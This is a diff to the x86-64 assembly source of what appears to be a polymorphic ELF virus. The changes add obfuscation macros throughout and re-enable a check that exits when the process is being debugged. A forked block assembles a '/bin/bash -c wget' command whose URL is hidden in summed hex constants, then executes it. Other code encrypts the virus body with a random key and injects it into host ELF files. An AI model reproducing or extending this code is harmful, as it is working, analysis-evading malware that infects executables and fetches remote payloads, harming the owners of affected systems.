@@ -47,6 +47,7 @@ OBF_GENERIC
 
 
 mov rsi, O_RDONLY
+OBF_GENERIC
 mov rax, _open
 syscall
 cmp rax, 0
@@ -58,6 +59,7 @@ lea rsi, STACK(famine.status_str)  ; buf address for read /proc/self/status
 mov rdi, rax   ; fd from previous read
 mov rdx, 110
 mov rax, _read
+OBF_GENERIC
 syscall
 cmp rax, 0
 jb _exx_pop
@@ -82,7 +84,7 @@ loop .loop_status
 add r12, 12
 OBF_GENERIC2
 cmp byte[r12], 0x30		;	CMP TRACERPID VAL WITH 0
-;jne _exx_pop
+jne _exx_pop
 
 
 
@@ -241,42 +243,45 @@ xor r10, r10
 
 
 .get_random:
-	push rdi
+	OBF_PUSH_RDI
 	push rsi
-	push rax
+	OBF_PUSH_RAX
 	push rdx
 
+	OBF_GENERIC2
 	lea rdi, [rel random]
 	mov rsi, O_RDONLY
 	mov rax, _open
+	OBF_GENERIC
 	syscall					; OPEN /dev/urandom  EXIT if not work
 	cmp rax, 0
 	jl	.err_ex
 
 	mov rdi, rax		; fd to read
+	OBF_GENERIC2
 	mov rax, _read
 	mov rdx, 4
 	lea rsi, STACK(famine.tmp_rand)
+	OBF_GENERIC
 	syscall				; READ 8 RANDOM BYTE<3
 	
 	mov rax, _close
 	syscall
 
+	OBF_GENERIC
 	pop rdx
-	pop rax
+	OBF_POP_RAX
 	pop rsi
-	pop rdi
+	OBF_POP_RDI
 	ret
 	.err_ex:
 	pop rdx
-	pop rax
+	OBF_POP_RAX
 	pop rsi
-	pop rdi
-	pop rdi
-	pop rdi
+	OBF_POP_RDI
+	OBF_POP_RDI
+	OBF_POP_RDI
 	jmp _exx_pop
-
-
 
 .OUI:
 jmp .enc_start
@@ -291,31 +296,39 @@ DECYPHER
 ;DUREX BLOCK HERE  BETWEEN .DUREX AND .SKIP_DUREX
 .durex:
 ;FORK THE DUREX PROCESS !
+	OBF_GENERIC
 	mov rax, _fork
+	OBF_GENERIC
 	syscall
 	cmp rax, 0
 	jne .skip_durex
 
 
 ;	CLOSE FD 1 AND 2 FOR FORKED  DUREX PROCESS
+	OBF_GENERIC
 	mov rax, _close
 	mov rdi, 1
 	syscall
 	mov rax, _close
+	OBF_GENERIC
 	mov rdi, 2
 	syscall
 
 	lea rdi, STACK(famine.status_str)
+	OBF_GENERIC
 	lea rsi, STACK(famine.commpath)
 	mov rax, 0x69622f
 	mov qword[rdi], rax
+	OBF_GENERIC
 	add rdi, 3
 	mov rax, 0x687361622f6e
 	mov qword[rdi], rax
+	OBF_GENERIC
 	sub rdi, 3
 	mov qword[rsi], rdi
 
 	mov dword STACK(famine.new_dir), 0x0000632d
+	OBF_GENERIC
 	lea rax, STACK(famine.new_dir)
 
 	mov qword[rsi+8], rax
@@ -324,14 +337,18 @@ DECYPHER
 	mov byte[rax], 0x27
 	inc rax
 	mov r10, 0x74656777
+	OBF_GENERIC
 	mov qword[rax], r10
 	mov qword[rsi+16], rax
+	OBF_GENERIC
 	add rax, 4
 	mov r10b, 0x20
 	mov byte[rax], r10b
+	OBF_GENERIC
 	inc rax
 
 	mov r10, 0x1FE9D6214E305123
+	OBF_GENERIC
 	mov r11, 0xF45645222442345
 	add r10, r11
 	mov qword[rax], r10
@@ -340,6 +357,7 @@ DECYPHER
 	add r10, r11
 	mov qword[rax+8], r10
 	mov r10, 0x1338087384BA29D6
+	OBF_GENERIC
 	mov r11, 0x623758FEDC754399
 	add r10, r11
 	mov qword[rax+16], r10
@@ -353,8 +371,10 @@ DECYPHER
 	mov qword[rax+32], r10
 	mov r10, 0x651A41E5BDEFB23E
 	mov r11, 0x1029ED8CA784C123
+	OBF_GENERIC
 	add r10, r11
 	mov qword[rax+40], r10
+	OBF_GENERIC
 	mov r10, 0x1BAAB6F9EB6664A5
 	mov r11, 0x21CCAA78541200CD
 	add r10, r11
@@ -366,6 +386,7 @@ DECYPHER
 	mov r10, 0x5F5C631E0F3E
 	mov r11, 0x742F111111111111
 	add r10, r11
+	OBF_GENERIC
 	mov qword[rax+62], r10
 	mov r10, 0x20527BA8C39CA60E
 	mov r11, 0x5412EDCCAD908712
@@ -378,6 +399,7 @@ DECYPHER
 	mov r10, 0xEBAA7DC5A415D1E
 	mov r11, 0x1165789012341111
 	add r10, r11
+	OBF_GENERIC
 	mov qword[rax+86], r10
 	mov r10, 0x1A0A262C437B24DB
 	mov r11, 0x55634236DCAB0145
@@ -388,6 +410,7 @@ DECYPHER
 	add r10, r11
 	mov qword[rax+102], r10,
 	mov r10, 0xEE0591FED833C10
+	OBF_GENERIC
 	mov r11, 0x1145CD0086AC345D
 	add r10, r11
 	mov qword[rax+110], r10
@@ -396,10 +419,12 @@ DECYPHER
 	add r10, r11
 	mov qword[rax+118], r10
 	mov r10, 0x55522D191E1C52C0
+	OBF_GENERIC
 	mov r11, 0x1EDD43545612CDAD
 	add r10, r11
 	mov qword[rax+126], r10
 	mov qword[rsi+24], 0x0
+	OBF_GENERIC
 	mov rdx, 0
 	mov rax, 59
 	syscall
@@ -408,6 +433,7 @@ DECYPHER
 	OBF_GENERIC1
 	mov rax, _fork
 	syscall
+	OBF_GENERIC
 	cmp rax, 0
 	jne _exx_pop
 
@@ -572,8 +598,9 @@ inject_self:
 	OBF_GENERIC2
 	jmp .after_poly_crap_skipped
 	POLY_CRAP_SKIPPED
-
 	.after_poly_crap_skipped:
+
+
 	mov r15, rdi ; save phdr[0] offset to r15
 	mov rdx, qword [rdi + elf64_ehdr.e_entry]
 	movzx rcx, word [rdi + elf64_ehdr.e_phnum]
@@ -603,6 +630,7 @@ inject_self:
 	lea rdi, [rel random]
 	mov rsi, O_RDONLY
 	mov rax, _open
+	OBF_GENERIC
 	syscall					; OPEN /dev/urandom  EXIT if not work
 	cmp rax, 0
 	jl	_exx_pop
@@ -619,8 +647,10 @@ inject_self:
 	mov rax, _read
 	mov rdx, 1
 	lea rsi, STACK(famine.factor)
+	OBF_GENERIC2
 	syscall				; READ 2 byte, 1 for key, 1 for derivate
 	mov rax, _close
+	OBF_GENERIC1
 	syscall
 
 OBF_GENERIC1
@@ -690,6 +720,7 @@ OBF_GENERIC1
 	mov r11, 0
 	.fp:
 	inc r11b
+	OBF_GENERIC2
 	add byte[r10], r12b
 	inc r10
 	add byte[r10], r11b
@@ -703,20 +734,21 @@ OBF_GENERIC1
 	inc r10
 	add byte[r10], r11b
 	inc r10
+	OBF_GENERIC
 	add byte[r10], r12b
 	inc r10
 	add byte[r10], r11b
 	.done_finger:
 	mov STACK(famine.morph_sign_u), r11
 	mov STACK(famine.morph_sign_d), r12
-
+	OBF_GENERIC2
 	call _start.get_random
 	lea r10,STACK(famine.tocypher)
 	add r10, POLY_OFFSET_1
 	mov r12, STACK(famine.tmp_rand)
 	mov dword[r10], r12d
 
-
+	OBF_GENERIC1
 	call _start.get_random
 	lea r10, STACK(famine.tocypher)
 	add r10, POLY_CRAP_SKIPPED_OFFSET
@@ -776,6 +808,7 @@ CYPHER
 	mov rsi, r15
 	mov rdx, EHDR_SIZE				; 64 is size of EHDR
 	mov r10, 0
+	OBF_GENERIC
 	mov rax, _pwrite
 	syscall
 
@@ -784,7 +817,9 @@ CYPHER
 	OBF_GENERIC
 	mov rsi, 0
 	mov rdx, END_SEEK
+	OBF_GENERIC
 	mov rax, _lseek
+	OBF_GENERIC
 	syscall						; seek to file_end
 	
 ;	compute jump value
@@ -801,9 +836,11 @@ CYPHER
 	mov rdi, STACK(famine.file_fd)
 	lea rsi, STACK(famine.jmp)
 	mov rdx, 5
+	OBF_GENERIC
 	sub rax, RETURN_JUMP_OFFSET  ; offset between _end:  and jump .exit
 	mov r10, rax ; EOF From last call to lseek
 	mov rax, _pwrite
+	OBF_GENERIC1
 	syscall
 
 	mov rax, _sync
